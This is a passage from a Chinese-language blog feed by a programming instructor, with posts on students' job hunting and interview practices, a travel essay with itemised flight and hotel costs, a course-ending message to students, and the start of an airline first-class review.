        <content type="html"><![CDATA[<p>先幫不知道這篇在寫什麼的讀者補一下脈絡。</p><p>我有在做以求職為導向的程式教學，為期半年的課程最近差不多快結束了，學生慢慢開始出來求職，找尋前端或後端工程師的相關工作。</p><p>因此最近有一些心得，想說寫在 Medium 記起來。</p><h3 id="談薪水"><a href="#談薪水" class="headerlink" title="談薪水"></a>談薪水</h3><p>我會依據自己所知道的市場狀況以及上一期學生的<a href="/2019/03/13/mentor-program-2nd-result-3cb7c2b6627e/">求職狀況</a>給大家一個薪水範圍，讓大家在開價的時候能夠參考。</p><p>我給的範圍是 40k~50k，這是一般學生的參考範圍，如果表現更好的話可以再往上提升。</p><p>但後來我發現到一個小問題，那就是有些公司不一定能給到這樣的範圍。讓我一度思考說到底是哪個環節出了差錯，會不會是我用「老師濾鏡」去看學生，覺得自己教出來的學生一定比較厲害，所以高估了他們？又或者是帶了半年的學生有感情了，才會希望他們可以拿到比較高的薪水？</p><p>仔細想了想，的確跟帶了半年有關，但理由不是上面這麼膚淺。</p><p>以大多數公司的面試流程來講，講求的是效率。希望在一兩次，總時長不超過三小時的面試裡面確認這個人是否合格。以這種情況來講，考什麼就變得相當重要。</p><p>前端工程師最常見的就是考一些 JavaScript 常見問題，把 hoisting、prototype、coercion、this、scope 全部拿出來問，以此判定這個面試者是否合格。</p><p>我不否認這是一種判定方法，也認為這種方法可能真的是公司想要的，是面試官肯定並覺得有價值的。但若是我來當面試官，我會想要測驗出更多面向，而不是只著重在這些比較制式化的考題。</p><p>以上面的考題來說，可以測得出來面試者對這些 JavaScript 核心概念是否熟悉，但測不出來「解決問題」的能力。</p><p>那如果想測這個應該怎麼測？以 Stripe 以前的<a href="https://www.quora.com/What-is-the-engineering-interview-process-like-at-Stripe">面試流程</a>（現在有沒有改我不知道）為例，會有兩個小測驗，第一個會給你一個有 bug 的 open source project，要你把這個 bug 修掉。第二個是給你一個需要重構的專案，讓你盡可能去改善它。</p><p>這個面試流程就很貼近工作，就能多少鑑別出面試者在工作上的表現。</p><p>或是 <a href="https://automattic.com/work-with-us/how-we-hire-developers/">Automattic</a>（Wordpress 背後的公司）的面試流程，到最後一關還會先讓你跟他們合作一個有償的 project，藉此機會看看是不是適合一起工作。</p><p>有人可能會想說我怎麼都舉一些大公司，大公司有錢有時間，當然可以做這麼多東西，小公司就是沒資源，所以只能採用最快速且有效率的方法。</p><p>但我覺得就算公司小也可以想一下其他方法，比如說現在就有滿多公司會在面試前先寄一個小作業讓面試者寫，寫完之後根據作業內容決定要不要找來面試，我覺得這樣就是不錯的做法。</p><p>如果面試者覺得太花時間，公司也可以讓面試者自行提交作品當作審核標準，我認為也是 ok 的。</p><p>好，講了這麼多，這到底跟我學生有什麼關係？</p><p>我想講的是：</p><blockquote><p>我在學生身上看到的，是很多公司在短短的面試流程裡面看不到的。</p></blockquote><p>我看了學生半年，改了半年的作業，我知道這個學生每次交的作業都會考量到一些 edge case，知道他的 code quality 不錯，知道他會自己研究新的技術並試著實作出來，也知道他通常都可以自己 debug 不必來問我問題，就算問我問題也能問出個好問題，而不是不知所云要人通靈。</p><p>而且最重要的是，<strong>我會願意跟他一起工作，我會希望跟他變成同事</strong>。</p><p>因為我看到了這些，所以覺得這些學生有這個價值。但很多公司看不到，而且在面試流程中也很難展現出這些特質，因此公司給的價格就不一樣了。我這邊並沒有要責怪那些公司的意思，畢竟他們看到的就是這樣。</p><p>我只是會多少覺得有點可惜，可惜這些特質沒有被人看見。也有可能是學生不懂怎麼表現出來，身為導師就需要去想一下有沒有什麼方法可以改善這個現象。</p><h3 id="談拖累"><a href="#談拖累" class="headerlink" title="談拖累"></a>談拖累</h3><p>因為這個計畫沒有很知名，所以如果履歷上有寫而且面試官有注意到，通常都會好奇問一下計畫內容之類的。也因為學生人數不多，若是有其他同學也面到同一個面試官，多少也會稍微提一下。</p><p>然後有些面試官可能聽到導師是我以後就會表示有聽過我，或是看過我寫的文章。若是學生在面試中表現不好，就會覺得自己是不是拖累了我，丟了我的臉。</p><p>從老師的角度思考，的確有可能是我教得不好，所以學生面試表現才會不佳，例如說我有地方教錯或是很重要的地方沒講到之類的，這就的確是我的問題，所以來自面試官的批評就必須要承受。</p><p>但如果是學生自己的問題呢？那這樣子我也要連帶承受批評不是很衰嗎？</p><p>不，我不會這樣覺得，而且也不應該這樣覺得。</p><p>因為如果是這樣的話，很容易就會造成「學生自助餐」，外面表現不好的學生一律切割，說那都是他們的問題；表現好的就通通把功勞攬在自己身上，說這都是自己厲害。</p><p>我打從心裡不覺得是這樣啊，我覺得如果學生有問題，老師也要連帶承受部分責任。我一樣會吃學生自助餐，但我的會長這樣：「表現好的都是學生自己厲害，表現不好的都是我的問題。」</p><p>話說「學生有問題，老師也要連帶承受部分責任」這句話是要看脈絡跟場合的，有些需要有些不需要。比如說學生面試時被問到「二維陣列是什麼」如果不知道，那我就會覺得是我的問題，怎麼這麼基本的東西我居然忘記講到。</p><p>但如果是面試時態度不佳或者是被問已經教過的問題卻答不出來，那的確是學生自己的問題。</p><p>除了拖累我以外，也有學生覺得會拖累到其他計畫的同學。</p><p>以我的角度思考，我會想說：「這計畫本來就有很多能力各異的同學，一個同學表現不好，沒辦法推論出其他也不好。我就知道有很多能力很強的學生。」</p><p>但是以面試官的角度思考，假設我今天面了兩三個同一個計畫出來的學生，結果表現都不怎麼樣，的確會影響到之後的其他面試（但前提是樣本數要夠多啦）。</p><p>以前的確有聽說過有某些公司不找某某機構培訓出來的人之類的，大概就是類似的道理，因為面過太多都太雷，就不想再浪費時間了。</p><p>總之有關於這個問題，我覺得學生如果出去面試時還要擔心是不是會拖累其他人的話也太累了，反正就去面試然後好好表現就對了。</p><p>寫到這邊的時候，我想到這種狀況很像是以前團體裡面會出現的「團體榮譽感」之類的，學生時期老師跟學校最愛用這種東西操控學生了。會說什麼整個班級就是一個團體，如果拿了整潔第一名，就是幫整個班級爭取榮譽；如果整潔不好，就是這整個班整潔都不好，會讓班上丟臉之類的。</p><p>我一直都很不喜歡這種把個人跟團體綁架在一起的概念，或許這就是我不喜歡參與團體的原因之一吧。</p><p>之前還有想過一個類似的問題，與教學完全無關但我想順便拿出來談一下。例如說假設今天有個台灣人在日本機場大鬧之類的，可能就會有人覺得「不要丟台灣人的臉」。</p><p>可是從理性的角度去思考，這個行為是跟個人有關，跟他的國籍應該沒什麼關係吧？一個台灣人這樣做，不能代表台灣人民的素質就是如何，只能代表「有一個台灣人他的行為素質很差」而已。</p><p>既然是個人的問題，那好像不應該與國籍扯上關係。</p><p>不過或許有一種合理的解釋，那就是儘管是個人行為，但這件事情會讓日本人在想到台灣時聯想到這個新聞，會對台灣的形象有負面的影響，因此才會「丟台灣的臉」。</p><h3 id="談自信"><a href="#談自信" class="headerlink" title="談自信"></a>談自信</h3><p>之前就有<a href="/2019/04/13/4-years-review-7fb7edc52687/">說過</a>自信真的是靠北難掌握的一個東西。</p><p>學生在求職的時候也能看出來這個現象，雖然學了半年但沒什麼自信，覺得自己好像還是找不到工作之類的。但這不是一件好事情，因為他們其實是有能力的，是能找到工作的。</p><p>自信與實力能相符是最好的，但大多數學生是實力大於自信的。</p><p>這邊我給他們的建議是透過求職建立自信，你可能會得到面試官的稱讚，會拿到 offer，就可以一步步把自信建立起來，知道自己其實是有這個能力的。</p><p>不過也可以換個角度來想想，是不是課程上能做什麼來改善這點？例如說把課程強度增加，盡量與之後工作內容不要差異太多，是不是就能讓他們變得比較有自信？</p><p>或者也可以把期末專題變成強制的，讓大家一定要做出一個比較具有規模的東西，對於增加自信應該也會滿有幫助的。</p><p>有些學生其實會讓我看到剛出社會的自己，我那時也是空有一身實力但沒太大自信，在求職上就會滿劣勢的。至於「空有一身實力」這件事當初我也不知道，是後來才體會到的，才發現原來那時自己已經比很多人都厲害。</p><p>以上是一些隨意的心得分享，大家加減看就好。</p><p>最後也祝學生們求職順利！</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旅行的意義（下）：寫在遊阿布達比、歐洲與韓國後</title>
      <link href="/2019/10/31/travel-part2-818482a90bc9/"/>
      <url>/2019/10/31/travel-part2-818482a90bc9/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/travel-part2-818482a90bc9/1__8ukUiIC3lg6zRaz5bOprbg.jpeg"></p><p>這是系列文的下集，如果沒看過上集的可以點這邊：<a href="/2019/07/13/travel-part1-46e50a306467/">旅行的意義（上）：寫在遊日本、越南與美國後</a>。</p><p>上集去了日本三個禮拜，越南兩個禮拜然後美國一個月左右。</p><p>下集去了阿布達比跟杜拜各玩了三天，去了歐洲（法國巴黎、英國倫敦、荷蘭阿姆斯特丹、德國柏林、慕尼黑、瑞士蘇黎世、義大利米蘭、布雷西亞、威尼斯、西班牙巴塞隆納）五個禮拜，韓國（首爾、仁川、釜山、大邱、大田）兩個禮拜。</p><p>基本上對於旅遊的感想跟之前寫的差不多，認為旅遊就是：「在不同的地方，做自己想做的事」。所以這趟旅行一樣十分隨意，基本上都是前一天才決定隔天要去哪裡，如果沒有特別想去的地方就待在飯店裡用電腦，看看 YouTube 打發時間，跟我在台灣的生活差不多。</p><p>先來講講這次旅遊的一些心得。</p><h3 id="自由行與跟團"><a href="#自由行與跟團" class="headerlink" title="自由行與跟團"></a>自由行與跟團</h3><p>我有一度思考了一下，以我這種隨意玩的個性，是不是跟團其實也不錯？反正不用帶腦，都跟著旅行團走就好了，連午餐晚餐要吃什麼都不用思考，十分方便。</p><p>這次去慕尼黑的時候有跟了一個網路上買的新天鵝堡團，是一整天的行程，結果一跟團就發現自己還是比較適合自由行。</p><p>跟團是很方便沒錯，不用查交通資訊跟景點，都讓旅行社負責就好。</p><p>但團體就是有利有弊，弊就是必須受制於其他人，例如說集合的時候要等，然後行程中有哪個地方想停留久一點或短一點也沒辦法，跟團就是這樣，行程是死的，然後都要團體活動。</p><p>但我不喜歡這種受制於其他人的感覺，我想要自由——想去哪就去哪，想待多久就待多久的自由。</p><p><img src="/img/travel-part2-818482a90bc9/1__xqw3vy80quAxwuV1LUAtgg.jpeg"></p><h3 id="歐美與亞洲"><a href="#歐美與亞洲" class="headerlink" title="歐美與亞洲"></a>歐美與亞洲</h3><p>之前去日本跟美國的時候，我比較喜歡日本。這次去歐美跟韓國，我也比較喜歡韓國。在旅遊方面，目前我最喜歡的應該就是東北亞（日本跟韓國）吧。</p><p>以下提幾點理由。</p><h4 id="治安"><a href="#治安" class="headerlink" title="治安"></a>治安</h4><p>其實我這次去歐洲沒有感覺到治安有特別差，但可能是因為我特別小心。我出門不帶包包的，就穿一件風衣外套，然後錢包手機放外套口袋裡（有拉鍊可以拉起來），這麼輕便的裝備再加上我也不太拍照，看起來應該不太像觀光客。</p><p>但儘管如此，我還是親眼目睹了一些知名的景象。</p><p>例如說去艾菲爾鐵塔的時候一到附近就看到一大堆套幸運繩的，還有要你簽名的簽名黨，如果不知道這些是什麼可以去查一下 YouTube 影片。我看到的時候真的嚇到，因為我原本以為就兩三個，沒想到是二三十個，然後散佈各地，是一個大型集團。</p><p>巴黎是我看到最多的，其他就比較少。去柏林的時候在布蘭登堡門一樣有碰到簽名黨，我二話不說直接跑走。在威尼斯的橋上有看到玩球猜謎賭博的那種，但也就這麼一次。</p><p>雖然說這些如果有小心避開或是強硬拒絕的話，應該都不會怎樣，但這還是治安上的問題。在台北、東京或是首爾我就不用擔心有人在我手上套幸運繩要我付錢，也不用擔心有人叫我簽名捐款什麼的，自在很多。</p><h4 id="食物"><a href="#食物" class="headerlink" title="食物"></a>食物</h4><p>在歐洲的時候食物也沒有吃得很習慣，然後很多地方沒進去以前你也不知道是賣什麼的，不像日本韓國會在店門口貼圖片。很多餐我都不知道吃什麼，最後都吃了麥當勞，畢竟麥當勞真的方便，而且點餐都有自動點餐機，既沒有語言問題，也不用跟人講到話（對，就是這麼不喜歡講話）。</p><p>韓國的食物就習慣多了，炸醬麵、炸雞、年糕、豬肉湯飯、人參雞…每一個都滿好吃的，而且滿開胃的，滿容易就會吃得比想像中還多。</p><h4 id="歸屬感"><a href="#歸屬感" class="headerlink" title="歸屬感"></a>歸屬感</h4><p>這一點其實不太知道怎麼精確地給一個名詞，但歸屬感應該滿類似的。</p><p>走在歐洲路上的時候你很清楚知道自己是一個亞洲人，然後身邊都是西方臉孔。就算在觀光景點，亞洲人依然是少數。可是走在韓國路上的時候，情況就完全顛倒過來。</p><p>會讓我覺得比較有…歸屬感？或者是說有著「出現在這邊比較不奇怪」的想法，「奇怪」在這邊不是一個負面用詞，我的意思是當我在歐洲的時候，我是少數；可是在日韓就不會這樣，雖然你清楚知道這是一個不同的國家，但卻會覺得跟當地的距離好像近很多。</p><p>這邊補充一個不相干的，因為我不知道放在哪比較好。我覺得歐美男生跟亞洲男生差最大的一點就是髮型。比較少看到歐美男生有瀏海，就算有也是往上梳，但亞洲男生就會用瀏海蓋住額頭，而且頭髮普遍比較長。</p><h4 id="廁所"><a href="#廁所" class="headerlink" title="廁所"></a>廁所</h4><p>歐洲要付錢上廁所超麻煩的，我不是不願意付錢，而是我不喜歡硬幣，因為我覺得很重很麻煩，所以我身上都只有紙鈔跟信用卡。我知道有星巴克可以去，有些速食店也可以跟在別人後面什麼的，但整體看下來依舊麻煩。</p><p>相對之下日韓跟台灣就友善很多，廁所很好找。我一到韓國的第一天就瘋狂上廁所，上一次賺 0.5 歐元，上一百次就賺 50 歐元，爽賺。</p><h3 id="人多的景點先扣三十分"><a href="#人多的景點先扣三十分" class="headerlink" title="人多的景點先扣三十分"></a>人多的景點先扣三十分</h3><p><img src="/img/travel-part2-818482a90bc9/1__NdJ6x4vn8SzfT0ZCNBD__pA.jpeg"></p><p>無論景點再怎麼好，人太多就是先扣掉三十分。我真的滿討厭人多的地方。更好的說法是「當我一個人旅遊時，討厭人多的地方」，如果是一群人的話我就可以接受。</p><p>我之後有仔細想了一下原因，大概是一個人在熱鬧的地方時更顯得孤寂吧，但如果在一個本來就很冷清的地方，就不會特別覺得有什麼。跟個性也有些相關，有些人就算一個人，也會想要去很熱鬧的地方找別人一起玩，但我不是那種類型。一個人的時候就是喜歡一個人到處走，這時候就要挑一個安靜的地方比較好。</p><p>去荷蘭的時候其實我並沒有到阿姆斯特丹市中心過，比較多時間是待在下方的阿姆斯多芬（Amstelveen），是這趟旅行中我最喜歡的地方，也是我住的地方。這邊不是什麼觀光區，滿安靜的。</p><p>附近步行也可以到一些當地景點，例如說 Amsterdamse Bos，是一個森林公園，我在那邊散步了整個下午，很舒服。</p><p><img src="/img/travel-part2-818482a90bc9/1__c__8XXKqHYzoEM__7noYFPJA.jpeg"></p><h3 id="部落格的威力"><a href="#部落格的威力" class="headerlink" title="部落格的威力"></a>部落格的威力</h3><p>之前在韓國時不知道吃什麼，在網路上隨意估狗「大邱 美食」之後找到一個部落客的食記，是賣烤肉加烏龍麵的一間感覺很不錯的餐廳。雖然店裡只有韓文菜單，但那個部落客很貼心地拍了菜單順便加註中文。</p><p>實際去吃的時候先表明不會韓文，結果店家居然拿了那個部落客加註的圖片給我看，那時我瞬間明白了 SEO 以及部落客業配的重要性。</p><p>因為我同時回想起之前隨意去吃一間炸雞，後面桌的台灣人也一直在說哪個部落客有寫哪間店，前幾天在釜山去吃人參雞的時候，我也是隨意估狗然後就跑去吃，結果發現店裡另外兩組客人都是台灣人。</p><p>也就是說，應該滿多台灣觀光客會先估狗有什麼吃的，然後就跑去吃。</p><p>就算是韓國當地的店也一樣，語言不通沒關係，反正部落客有寫過，知道是吃什麼的。而且如果這個地點比較冷門，中文資源應該很少，搞不好隨意一找就是某間店。</p><p>在這個情況下，如果有台灣部落客來吃那間店的話，就滿有可能吸引到台灣來的觀光客也跑去吃。因此韓國的店家應該要找台灣部落客來業配才對；台灣的應該也找日韓部落客來業配，吸引外國觀光客。</p><h3 id="旅行費用計算"><a href="#旅行費用計算" class="headerlink" title="旅行費用計算"></a>旅行費用計算</h3><p>好，終於來到這一 part 了，我會連上集的部分一起統計出來。</p><p>詳細的交通跟吃的花費太難算因此我就跳過了，這邊只統計機票跟住宿，如果轉機的話我會分成兩個班次，這樣比較好列出來。</p><h4 id="日本行"><a href="#日本行" class="headerlink" title="日本行"></a>日本行</h4><p>搭乘的班次如下：</p><p>1. TSA（松山）-&gt; HND（羽田）<br>2. HND（羽田）-&gt; AOJ（青森）<br>3. AOJ（青森）-&gt; CTS（札幌）<br>4. CTS（札幌）-&gt; FUK（福岡）<br>5. FUK（福岡）-&gt; SDJ（仙台）<br>6. SDJ（仙台）-&gt; FUK（福岡）<br>7. FUK（福岡）-&gt; HNA（花卷）<br>8. HNA（花卷）-&gt; FUK（福岡）<br>9. FUK（福岡）-&gt; HNA（花卷）<br>10. HNA（花卷）-&gt; ITM（大阪）<br>11. ITM（大阪）-&gt; MSJ（三澤）<br>12. MSJ（三澤）-&gt; ITM（大阪）<br>13. ITM（大阪）-&gt; AOJ（青森）<br>14. AOJ（青森）-&gt; ITM（大阪）<br>15. ITM（大阪）-&gt; AOJ（青森）<br>16. AOJ（青森）-&gt; HND（羽田）<br>17. HND（羽田）-&gt; ISG（石垣）<br>18. ISG（石垣）-&gt; HND（羽田）<br>19. HND（羽田）-&gt; TSA（松山）</p><p>一共 19 個班次，全部都 JL 經濟艙，一共 45454 元。（為什麼要搭這麼多飛機請參考：<a href="/2019/06/01/jgc-and-jal-ctystal-862f2bb4af8b/">非典型微 JGC 修行（JMB 水晶卡）之旅</a>）</p><p>總共待了 23 個晚上，4 個晚上靠朋友，19 個晚上自費<br>住宿費共 18487 元，平均一個晚上 973 元（有住飯店也有住膠囊旅館跟 hostel）</p><h4 id="越南美國行"><a href="#越南美國行" class="headerlink" title="越南美國行"></a>越南美國行</h4><p>搭乘的班次如下：</p><p>1. TPE（桃園）-&gt; HAN（河內）<br>2. HAN（河內）-&gt; HKG（香港）商務、轉機<br>3. HKG（香港）-&gt; EWR（紐約）商務<br>4. EWR（紐約）-&gt; IAH（休士頓）<br>5. IAH（休士頓）-&gt; EWR（紐約）<br>6. EWR（紐約）-&gt; HKG（香港）商務、轉機<br>7. HKG（香港）-&gt; HAN（河內）商務<br>8. HAN（河內）-&gt; HKG（香港）商務、轉機<br>9. HKG（香港）-&gt; SFO（舊金山）頭等<br>10. SFO（舊金山）-&gt; HKG（香港）頭等、轉機<br>11. HKG（香港）-&gt; HAN（河內）商務<br>12. HAN（河內）-&gt; TPE（桃園）</p><p>CI 河內來回 8629 元<br>UA 休士頓來回 10793 元<br>CX 紐約來回 38076 元（商務，國泰 bug 票）<br>CX 舊金山來回 37311 元（頭等，國泰 bug 票）</p><p>12 個班次，共 94809 元</p><p>總共待了 40 個晚上，14 個晚上靠朋友，26 個晚上自費<br>住宿費共 70306 元，平均一個晚上 2704 元（都是飯店或 Airbnb）</p><h4 id="中東歐洲韓國行"><a href="#中東歐洲韓國行" class="headerlink" title="中東歐洲韓國行"></a>中東歐洲韓國行</h4><p>搭乘的班次如下：</p><p>1. TPE（桃園）-&gt; HKG（香港）商務、轉機<br>2. HKG（香港）-&gt; AUH（阿布達比）商務<br>3. AUH（阿布達比）-&gt; CDG（巴黎）商務<br>4. CDG（巴黎）-&gt; LGW（倫敦）<br>5. LGW（倫敦）-&gt; AMS（阿姆斯特丹）<br>6. AMS（阿姆斯特丹）-&gt; SXF（柏林）<br>7. VCE（威尼斯）-&gt; MAD（馬德里）轉機<br>8. MAD（馬德里）-&gt; BCN（巴塞隆納）<br>9. BCN（巴塞隆納）-&gt; AUH（阿布達比）商務、轉機<br>10. AUH（阿布達比）-&gt; ICN（首爾）競標升級頭等<br>11. ICN（首爾） -&gt; TPE（桃園）商務</p><p>EY 台北歐洲來回 67579 元（特價商務艙）<br>IB 巴黎到倫敦 2424 元<br>BA 倫敦到阿姆斯特丹 1653 元<br>U2 阿姆斯特丹到柏林 3294 元<br>IB 威尼斯到巴塞隆納 2407 元<br>EY 阿布達比到首爾升級頭等 26256 元<br>（心得可參考：<a href="/2019/10/14/etihad-a380-auh-icn-first-class-352fdbbc08db/">EY876 AUH-ICN A380 阿提哈德頭等艙體驗心得</a>）</p><p>11 個班次，共 103613 元</p><p>總共待了 54 個晚上，7 個晚上靠朋友，47 個晚上自費<br>住宿費共 121417 元，平均一個晚上 2583 元（全都飯店）</p><h4 id="花費總結"><a href="#花費總結" class="headerlink" title="花費總結"></a>花費總結</h4><p>一共搭了 42 個班次，共 243876 元</p><p>一共 117 個晚上，92 個晚上自費<br>住宿費共 210210 元，平均一個晚上 2284 元</p><p>所以機票+住宿，總花費大約是 45 萬新台幣。其實在統計之前我也沒想到會這麼多，對於金錢實在是沒什麼概念。</p><p>不過我這趟旅程本來就過的不節儉，如果想省錢的話其實可以省的地方滿多的。例如說機票如果不要升等頭等也不要買商務艙，可以省個五六萬，不要 JGC 修行的話也可以再省個兩三萬。</p><p>住宿的部分日本比我想像的還便宜，可能是有滿多天住在 hostel 的緣故。不過之後的行程我都不想住青年旅館，還是喜歡一個人因此只住飯店，住宿費就高了許多（再加上歐美住宿費本來就比較貴）。</p><h3 id="心得總結"><a href="#心得總結" class="headerlink" title="心得總結"></a>心得總結</h3><p>今年大概有一半的時間都在旅遊，是個十分放鬆的半年。而且開始放假之後變得很沒有時間觀念，我一直到十月中的時候才意識到說：「阿，原來十月了」，對今天是星期幾也不太在意，因為不用上班所以每天都是假日。</p><p>原本其實滿期待去歐洲的，因為以前完全沒去過，去了之後發現對歐洲沒什麼太大的愛，最愛的還是日本跟韓國。藉由這半年的遊蕩，逐漸抓到自己理想中一個人旅遊的樣貌——喜歡去沒什麼人的地方，是不是觀光區都無所謂，就算沒什麼可以看的，隨意散步我也很開心；喜歡可以待一整天適合用電腦的住宿，對吃不是那麼在意，隨便走進一間店都可以。</p><p>就跟上一集講的一樣，旅遊也是會累的，最累的部分是移動。打包行李、前往另一個地方、check-in、整理行李、check-out…拖著一個大的行李箱真的滿不方便，但也沒辦法，畢竟一次出來這麼久。</p><p>短期內應該是不會再旅遊了，這段期間也稍微想了一下之後的規劃是什麼，差不多有個底了，到時候再跟大家分享。</p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>這只是個開始——寫在第三期課程結束後</title>
      <link href="/2019/10/29/its-just-a-beginning-184b954df8a9/"/>
      <url>/2019/10/29/its-just-a-beginning-184b954df8a9/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/its-just-a-beginning-184b954df8a9/0__uaUOGoo6XWhdzseE.jpg"></p><p><a href="https://github.com/Lidemy/mentor-program-3rd">程式導師實驗計畫第三期</a>的課程告一段落了，依照主進度，教學的部分已經完全結束，但整個計畫結束的時間點會是 12 月中，到時候會再來跟大家分享心得以及成果。</p><p>我每個禮拜都會跟學生分享一些心得，這次的心得與結業有關，想了一下發現不只適用在自己的課程，應該很多課程都適用，所以就直接發在 Medium 了。</p><h3 id="這只是個開始"><a href="#這只是個開始" class="headerlink" title="這只是個開始"></a>這只是個開始</h3><p>課程結束了，雖然說還有許多尚待改進的地方，但我把我覺得重要的知識都教給你們了。接下來你們會出去面試，出去找工作，最後出去工作。真正進入職場，把以前學到的知識應用在工作上。</p><p>但這只是個開始，一個微不足道的開始。</p><h4 id="自己規劃的開始"><a href="#自己規劃的開始" class="headerlink" title="自己規劃的開始"></a>自己規劃的開始</h4><p>有些學生覺得課程結束之後失去了方向，因為沒有每週進度了，不知道接下來要學什麼，覺得茫然，覺得無助。</p><p>你自由了，但自由的代價是你要有更強大的自我管理能力。</p><p>之前六個月都依賴著課綱，知道下一步要幹嘛，知道最後自己會變成什麼樣子，但這不是一件可以一直持續的事。結業之後，你得靠自己了，不會再有人幫你規劃要學什麼，也不會有人告訴你說哪些知識是重要的。</p><p>雖然乍看之下是件壞事，不知道要學什麼，但換個角度想，這就代表著「想學什麼就學什麼」，不再受到進度與課程的限制，想研究什麼主題就研究什麼主題。</p><p>你要自己尋找，你要把主控權拉回自己手上，這才是唯一能持續的。</p><h4 id="面試的開始"><a href="#面試的開始" class="headerlink" title="面試的開始"></a>面試的開始</h4><p>在第一期的時候其實計畫名稱有個 prefix，叫做「從零到一」。六個月的課程你們學到很多，但沒學到的也很多，這很正常，我不可能把所有東西都放進課程裡面。而且就像我說過的，當你懂得愈多，不懂得也會愈多，你不該把這個視為一種缺陷，因為這是成長。</p><p>當你去面試的時候，你會被問到一些答不出來的問題，這沒什麼。我第一次去面試的時候也被問了一堆完全不會的問題，甚至到今天，我依然沒辦法回答出所有的面試題。</p><p>但重點是除了那些答不出來的問題以外，你答對了哪些？課程上著重教過的那些點你都有答對嗎？你有盡力地把自己會的東西表現出來嗎？正常狀況來講，應該還是有一半的題目你答的出來（沒有的話請去複習課程）。</p><p>不要把面試當作是測驗，請當作是聊天，是交流。不會的東西就說不會，但如果有知道類似的概念可以一併說出來，表達出你會的東西。面試一直一來都是雙向的，別忘記了這點。</p><p>在課程開始的時候，我跟大家說了要「好好看著自己」，跟著自己的步調走，盡力把課程完成。面試的時候也是，要好好地表達自己，想一下當初學程式的理由，想一下這半年寫作業時的酸甜苦辣，把這些都表達出來。</p><p>面試完可以快速覆盤一遍，最好是能把過程稍微條列出來，之後在寫面試心得的時候就有東西可以參考，可以寫得詳細一點，也記得把不會的問題稍微記下來，回家的時候去查一下。</p><p>成功也好，失敗也罷，無論如何都增加了經驗值。我每次教學也都沒在怕的，教得不夠好就不夠好，再改進就是了。如果失敗是必然的，那重點就是如何從失敗當中學習，而不是把自己困在負面情緒裡面。</p><p>最後，別忘了一件很重要的事：<a href="http://www.30abysses.com/TWY/2017/02/06/they-want-you-to-be-successful.html">全部的人都希望你成功</a>。</p><h4 id="工作的開始"><a href="#工作的開始" class="headerlink" title="工作的開始"></a>工作的開始</h4><p>課程只是新手村，是帶你學會基礎的地方。儘管當初在寫作業的時候依然花了你不少工夫，但跟業界會碰到的專案相比，作業簡單多了，規格也明確多了。</p><p>出去工作之後你會發現，作業根本不算什麼。或許你會發現教的東西沒用到，會發現要學一堆沒聽過的技術，要看一份幾萬行 code 的專案，de 根本不知道原因的 bug。</p><p>這就是為什麼工作能讓人快速成長，因為強度比自己練習時高太多了。</p><p>但你在課程內學到的東西絕對不是沒有用，如果你沒有學這些，根本連工作的門檻都達不到。基礎之所以是基礎，就是因為你這輩子都逃不開它。無論你多努力去忽略，最後總有一天它會找上你，晚學不如早學，早點把基礎打好比較實際。</p><p>知道這只是開始之後，感覺如何？</p><p>可能一開始覺得有點無助，後來逐漸習慣，但無論如何，我希望最後你是感到興奮的。對自己未來的發展感到興奮，對工作的內容感到興奮，對日後可以學到的東西感到興奮。</p><p>因為這只是個開始，代表著日後還有許多東西可以讓你探索，有著更多更多的可能性。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EY876 AUH-ICN A380 阿提哈德頭等艙體驗心得</title>
      <link href="/2019/10/14/etihad-a380-auh-icn-first-class-352fdbbc08db/"/>
      <url>/2019/10/14/etihad-a380-auh-icn-first-class-352fdbbc08db/</url>
      
        <content type="html"><![CDATA[<p>之前搭國泰的時候有在臉書上隨意 po 了一些心得，因為搭起來覺得不怎麼樣所以沒有認真寫。這次搭阿提哈德的頭等艙，終於有想像中的頭等艙的感覺了。</p><p>先來講這一段頭等艙到底花了多少錢好了。</p><p>我這趟旅行本來就是買了特價的阿提哈德商務艙機票，包含以下六段：</p><ol><li>TPE（桃園）-&gt; HKG（香港） 轉機</li><li>HKG（香港）-&gt; AUH（阿布達比）</li><li>AUH（阿布達比）-&gt; CDG（巴黎）</li><li>BCN（巴塞隆納）-&gt; AUH（阿布達比）</li><li>AUH（阿布達比）-&gt; ICN（首爾）</li><li>ICN（首爾）-&gt; TPE（桃園）</li></ol><p>上面這六段全程商務艙，票價大約是 67k 台幣左右。當初想一想覺得滿划算的，躺著飛中東再躺著飛歐洲，花兩三天研究票規之後就在 OTA 上面開票了。</p><p>在大概一個月前收到阿提哈德的信，問我要不要競標 AUH-ICN 那一段的頭等艙。先幫不知道什麼是競標的人科普一下，總之航空公司偶爾會開放大家用「競標」的方式升級艙等，有一個底價，然後出多少你自己決定，有標到就付錢升級。</p><p>以前搭新航的時候也會一直寄信要我標商務艙，但要標商務艙的那個錢太貴了我花不下去。但這次升等不一樣，底價是 850 USD，大概 26k 台幣，我想一想覺得好像沒有到很貴。我新加坡來回從經濟升等商務好像還比這個貴，而且 AUH-CDG 那段也有開放競標，底價是 2000 USD，我想說這差距也太大。</p><p>總之想了一下之後發現 26k 體驗一下頭等艙加空中洗澡算是很划算的了，就加十塊出個 860 USD，想說沒標到就算了。</p><p>然後出發前一個禮拜跟我說標到了，頭等艙之旅正式展開。</p><p>飛到 AUH 之後第一件事當然是進去頭等貴賓室吃吃喝喝，點了兩道菜，第一道是這個 sea bass，好吃！下面紅色那個是飯跟馬鈴薯之類的</p><p><img src="/img/etihad-a380-auh-icn-first-class-352fdbbc08db/0__ujyoIcz4zVBMtBYV.jpg"></p><p>再來點了個 beef tenderloin 五分熟，真滴好吃：</p><p><img src="/img/etihad-a380-auh-icn-first-class-352fdbbc08db/0__09bkD__ImKsoTENjY.jpg"></p><p>後面那個乍看之下像香蕉但應該不是，不過我也吃不出來是什麼。只知道應該有馬鈴薯泥在裡面，然後上面那個我也不知道是什麼，我其實沒有仔細看菜單。</p><p>吃完之後去沖個澡，浴室其實滿漂亮的：</p><p><img 